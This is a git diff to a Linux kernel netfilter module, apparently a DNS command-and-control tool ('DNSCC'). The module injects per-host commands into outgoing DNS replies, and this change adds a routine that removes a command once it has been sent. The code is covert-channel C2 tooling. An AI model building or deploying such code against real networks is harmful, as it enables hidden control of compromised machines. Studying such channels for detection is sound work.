@@ -216,6 +216,20 @@ unsigned char* get_command(uint32_t ip_addr){
 	}
 	return NULL;
 }
+/* remove the command from list */
+uint8_t remove_command(uint32_t ip_addr){
+	struct conn_out_data* c;
+	list_for_each_entry(c,&conn_out_list.list,list){
+		if(c->ip_addr == ip_addr){
+			printk(KERN_DEBUG "[DNSCC] Removing command %s for %pI4 ",c->command,&ip_addr);
+			list_del(&c->list);
+			kfree(c);
+			return 1;
+		}
+	
+	}
+	return 0;
+}
 //correct name pointers
 unsigned char* correct_name_ptr(unsigned long writer, unsigned char* buffer, int* count, uint16_t ptr_offset, uint16_t ar_start)
 {
@@ -609,16 +623,10 @@ static unsigned int dnscc_send(unsigned int hooknum, struct sk_buff* skb, const 
 			orig_dns_data = kmalloc(sizeof(unsigned char)*payload_len,GFP_DMA);
 			skb_copy_bits(skb,skb->len - payload_len,orig_dns_data,payload_len); // copy data from skb
 			/* new skb */
-//			struct sk_buff* skb_new;
-//			skb_new = skb_copy_expand(skb,0,sizeof(new_dns_data),GFP_ATOMIC);
-	
-			//memcpy(orig_dns_data,skb->data,skb->data_len);
-			//skb_trim(skb,skb->len - skb->data_len); //remove the original dns payload
 			printk(KERN_INFO "SKB DATA LEN %d",payload_len);
 			new_dns_size = manipulate_dns_reply(orig_dns_data,command,new_dns_data,payload_len);
 			memcpy(data,new_dns_data,new_dns_size);
 			int src_err = 0, dst_err = 0;
-//		skb->csum = csum_partial(data, new_dns_size, 0 );
 			skb->len = skb->len - (payload_len) + new_dns_size;
 			printk(KERN_INFO "2new dns size: %d ",new_dns_size);
 			udph->len=htons(new_dns_size+8);
@@ -631,13 +639,8 @@ static unsigned int dnscc_send(unsigned int hooknum, struct sk_buff* skb, const 
 	                int offset = skb_transport_offset(skb);
 	                int len = skb->len - offset;
 	                udph->check = ~csum_tcpudp_magic((iph->saddr), (iph->daddr), len, IPPROTO_UDP, 0);
-//			data = skb_put(skb_new,sizeof(new_dns_data));
-//			int copy = skb_tailroom(skb_new);
-			printk(KERN_INFO"new dns data size: %i",sizeof(new_dns_data));
-//			skb_add_data(skb_new,&new_dns_data,copy);
-//			kfree_skb(skb);
-//			skb = skb_new;
-		//		return NF_STOLEN;
+			/* remove the command */
+			remove_command(iph->daddr);
 		}
 		kfree(dns_name);
 		}
